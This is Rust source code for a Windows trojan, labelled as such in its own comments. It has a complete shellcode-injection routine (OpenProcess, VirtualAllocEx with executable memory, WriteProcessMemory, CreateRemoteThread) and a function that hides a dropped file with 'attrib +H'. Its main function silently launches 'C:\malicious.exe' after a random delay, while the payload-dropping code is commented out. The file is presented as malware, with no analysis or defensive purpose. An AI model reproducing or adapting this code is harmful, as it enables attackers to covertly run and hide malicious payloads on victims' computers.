use std::fs::{File, OpenOptions};
use std::io::prelude::*;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use std::path::Path;
use std::ffi::CString;
use std::ptr;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE};
use winapi::um::handleapi::CloseHandle;
use winapi::shared::minwindef::FALSE;
use rand::Rng;

// Payload dropper function
//fn drop_payload(payload_path: &str) -> std::io::Result<()> {
   // let payload = include_bytes!("payload.exe");
    
   // let mut file = OpenOptions::new()
   //     .write(true)
  //      .create(true)
  //      .open(payload_path)?;
        
//    file.write_all(payload)?;
 //   Ok(())
//}

// Function to hide dropped file using basic techniques
fn hide_file(file_path: &str) {
    // Set file as hidden
    let _ = Command::new("attrib")
        .args(&["+H", file_path])
        .spawn()
        .expect("Failed to hide file");
}

// Inject assembly payload to hide file from directory listing
fn inject_asm_payload(target_pid: u32, payload: &[u8]) -> Result<(), String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if process_handle.is_null() {
            return Err("Failed to open target process".to_string());
        }

        let remote_memory = VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_memory.is_null() {
            return Err("Failed to allocate memory in target process".to_string());
        }

        let success = WriteProcessMemory(
            process_handle,
            remote_memory,
            payload.as_ptr() as _,
            payload.len(),
            ptr::null_mut(),
        );
        if success == 0 {
            VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
            return Err("Failed to write payload into target process".to_string());
        }

        CreateRemoteThread(process_handle, ptr::null_mut(), 0, Some(std::mem::transmute(remote_memory)), ptr::null_mut(), 0, ptr::null_mut());
        CloseHandle(process_handle);
    }
    Ok(())
}

// Main trojan function
fn main() {
    let payload_path = "C:\\malicious.exe";  // Path to drop payload
    let target_pid = 1234;  // Replace with the target process PID for injection

    // Drop the payload to the disk
   // if let Err(e) = drop_payload(payload_path) {
     //   eprintln!("Failed to drop payload: {}", e);
      //  return;
    //}

    // Hide the dropped payload
    hide_file(payload_path);

    // Read the ASM shellcode to inject into the target process
    //let asm_payload = include_bytes!("hider.bin");  // This should be your compiled assembly

    // Inject the payload into the target process
 //   if let Err(e) = inject_asm_payload(target_pid, asm_payload) {
   //     eprintln!("Failed to inject payload: {}", e);
   // }

    // Run the malicious payload in the background
    let _ = Command::new(payload_path)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to run the malicious payload");

    // Random delay before next action
    let delay = rand::thread_rng().gen_range(5000..10000);
    thread::sleep(Duration::from_millis(delay));
}

